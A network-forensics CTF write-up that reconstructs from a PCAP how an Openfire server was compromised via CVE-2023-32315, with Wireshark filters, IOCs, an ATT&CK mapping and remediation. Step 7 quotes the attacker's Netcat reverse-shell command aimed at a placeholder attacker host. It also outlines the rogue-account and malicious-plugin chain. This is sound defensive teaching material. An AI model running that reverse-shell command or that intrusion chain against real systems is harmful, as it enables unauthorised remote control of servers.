# OpenFire - Network Forensics (PCAP)

**Environment:** CyberDefenders (Blue Team CTF)  ·  **Category:** Network Forensics  ·  **Difficulty:** Easy  ·  **Date completed:** [add your date, 2026-09-08]
**Tags:** `network-forensics` `pcap` `wireshark` `cve-2023-32315` `openfire` `mitre-attack`

> Educational lab exercise from CyberDefenders. Challenge-specific answer values (tokens, credentials, created usernames, host addresses) are redacted or masked in line with the platform's terms — the focus of this write-up is the PCAP analysis methodology.

---

## Scenario & objective

A packet capture from a compromised **Openfire** messaging server. The objective was to reconstruct the intrusion end-to-end from network traffic alone — identifying the initial login, unauthorised account creation, a malicious plugin upload, remote command execution, and the reverse shell — and to determine the vulnerability the attacker exploited.

This was a pure **network-forensics** exercise: no endpoint logs or memory image, just the wire. The whole investigation lived in the PCAP.

## Environment & data sources

- **Evidence:** a single PCAP of HTTP traffic to/from the Openfire admin console, plus the attacker's reverse-shell session
- **Protocol focus:** unencrypted HTTP (the admin console traffic was in cleartext, which exposed credentials, tokens, and commands to inspection)

## Tools used

- **Wireshark** — the entire investigation: display filters, chronological sorting, and HTTP/TCP stream following

## Investigation & methodology

**1. Order the timeline first.** Loaded the PCAP, applied an `http` filter, and sorted the time column ascending so events were strictly chronological — essential when the questions ask for the *first* login, the *first* account created, and so on. Getting the ordering right up front avoided misattributing later events to earlier ones.

**2. Isolate authentication.** Filtered to POST requests against the login endpoint (`http.request.method == "POST"`, `/login.jsp`) and inspected the earliest one. Because the traffic was cleartext, the request body exposed the submitted username, password, and the CSRF token directly — the first login's credentials and token came straight out of that single request.

**3. Find attacker-created accounts.** Pivoted with a URI filter (`http.request.uri contains "user"`) and looked specifically for `user-create.jsp` requests. The parameters on those requests carried the new usernames, passwords, and an admin-privilege flag; taking the earliest `user-create.jsp` in the ordered list gave the first account the attacker created.

**4. Identify the backdoor login.** Returning to the login POSTs, the *last* `login.jsp` request showed the attacker authenticating with one of the accounts created earlier — confirming they'd built a rogue admin account and then logged in with it to hold access.

**5. Spot the plugin upload by its shape, not its content.** Staying on the POST filter, a request to `plugin-admin.jsp` stood out purely by size — roughly **2.5 KB** against the few-hundred-byte login requests. That length anomaly was the tell. Following the HTTP stream confirmed a `multipart/form-data` body carrying a malicious **JAR plugin** — the persistence/RCE mechanism.

**6. Trace command execution.** Filtered on `http.request.uri contains "cmd"` to surface requests to the plugin's `cmd.jsp` endpoint (the command interface the malicious plugin exposed). Inspecting the first request's payload showed the attacker's opening move — a `whoami` to check privilege.

**7. Recover the reverse shell and follow it.** In the same command traffic, one `cmd.jsp` request carried a **Netcat reverse shell** back to the attacker's host (`nc <attacker-ip> <port> -e /bin/bash`). Switching from the HTTP view to the TCP stream for that session (`ip.src == <attacker-ip> && tcp.port == <port>`) exposed the interactive commands that followed — including network-interface recon (`ifconfig`).

**8. Attribute the root cause.** The exploitation pattern — an unauthenticated path into the admin console followed by a plugin upload leading to RCE — matched **CVE-2023-32315**, the Openfire admin-console path-traversal / authentication-bypass vulnerability. The observed chain (unauthorised access → plugin upload → command execution) aligned with it exactly.

## Key findings

Full intrusion reconstructed from the PCAP:

- **Initial access:** exploitation of the Openfire admin console (CVE-2023-32315), an unauthenticated path-traversal / auth bypass.
- **Persistence:** creation of rogue admin accounts (`<redacted>`), plus upload of a malicious JAR plugin (`<plugin>.jar`) exposing a command endpoint.
- **Execution:** commands run through the plugin's `cmd.jsp` — beginning with `whoami`.
- **Command & Control:** a **Netcat reverse shell** to the attacker's host (`<attacker-ip>:<port>`).
- **Discovery:** post-access recon over the shell (`ifconfig`) to enumerate the server's network interfaces.

## Indicators of compromise (IOCs)

*Answer-specific values masked in line with platform terms.*

| Type | Indicator | Notes |
|---|---|---|
| Web | POST `/plugin-admin.jsp` (~2.5 KB) | Anomalously large request = malicious JAR plugin upload |
| Web | `plugins/openfire-plugin/cmd.jsp` | Command-execution endpoint exposed by the plugin |
| Account | `<redacted>` (rogue admin accounts) | Attacker-created via `user-create.jsp` |
| Network | `<attacker-ip>:<port>` | Netcat reverse-shell destination |
| Vuln | CVE-2023-32315 | Openfire admin-console path traversal → plugin upload → RCE |

## MITRE ATT&CK mapping

| Tactic | Technique | Observed as |
|---|---|---|
| Initial Access | T1190 — Exploit Public-Facing Application | CVE-2023-32315 against the Openfire console |
| Persistence | T1136 — Create Account · T1505.003 — Web Shell | Rogue admin accounts + malicious JAR plugin |
| Execution | T1059 — Command & Scripting Interpreter | Commands via `cmd.jsp` |
| Command & Control | T1571 / reverse shell | Netcat `-e /bin/bash` callback |
| Discovery | T1033 / T1016 — System Owner & Network Config Discovery | `whoami`, `ifconfig` |

## Remediation & recommendations

- **Immediate:** patch Openfire to a fixed release for CVE-2023-32315; remove the malicious plugin and the rogue admin accounts; kill the reverse-shell session and block the attacker host.
- **Containment:** rotate all admin credentials; audit the plugin directory and admin-console access logs for other unauthorised changes.
- **Preventive:** restrict admin-console exposure (network segmentation / VPN-only access); enforce TLS so console traffic isn't cleartext; alert on plugin uploads and on outbound connections from the server to unexpected hosts/ports.

## Lessons learned

- **Anomalies show up in metadata, not just payloads.** The plugin upload was easiest to find by *packet size*, not by reading content — a reminder that request length, timing, and frequency are first-class indicators in network forensics.
- **Cleartext is the analyst's gift and the defender's failure.** Everything here was readable because the console ran over plain HTTP; the same fact that made the investigation straightforward is itself a critical finding to report.
- **Order before answers.** Sorting chronologically before touching any single question prevented "first vs last" mix-ups — a small discipline that made every subsequent step reliable.
- **Pivot views, not just filters.** The investigation needed both the HTTP view (to find the requests) and the TCP-stream view (to read the interactive shell) — knowing when to switch lens mattered as much as the filters themselves.
